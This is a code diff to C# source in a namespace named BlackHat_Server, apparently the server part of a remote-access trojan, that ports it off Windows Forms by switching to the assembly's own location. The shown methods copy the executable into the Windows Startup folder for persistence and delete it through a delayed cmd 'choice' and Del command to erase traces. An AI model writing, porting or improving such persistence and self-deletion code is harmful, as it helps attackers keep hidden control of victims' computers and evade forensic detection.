@@ -1,7 +1,8 @@
 ﻿using System;
 using System.IO;
+using System.Reflection;
 using System.Threading;
-using System.Windows.Forms;
+using bc.srv;
 
 namespace BlackHat_Server.Class
 {
@@ -130,7 +131,7 @@ namespace BlackHat_Server.Class
         private void CopyInStartup(string filename)
         {
             var path = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
-            var mynameEntire = Application.ExecutablePath;
+            var mynameEntire = Assembly.GetExecutingAssembly().Location;
 
 
             var finalDest = Path.Combine(path, filename);
@@ -154,7 +155,7 @@ namespace BlackHat_Server.Class
             if (File.Exists(finalDestination)) return;
             
             Directory.CreateDirectory(Path.GetDirectoryName(finalDestination));
-            File.Copy(Application.ExecutablePath, finalDestination);
+            File.Copy(Assembly.GetExecutingAssembly().Location, finalDestination);
 
             try
             {
@@ -171,13 +172,13 @@ namespace BlackHat_Server.Class
         /// </summary>
         public void DeleteMySelf()
         {
-            var arg = string.Format("/C choice /C Y /N /D Y /T 9 & Del \"{0}\"", Application.ExecutablePath);
+            var arg = string.Format("/C choice /C Y /N /D Y /T 9 & Del \"{0}\"", Assembly.GetExecutingAssembly().Location);
 
             var dr = new DosRunner();
 
             dr.RunDosSelfDelete(arg);
 
-            Application.Exit();
+            Program.Exit(3);
         }
         //-----------------------------------------------
     }
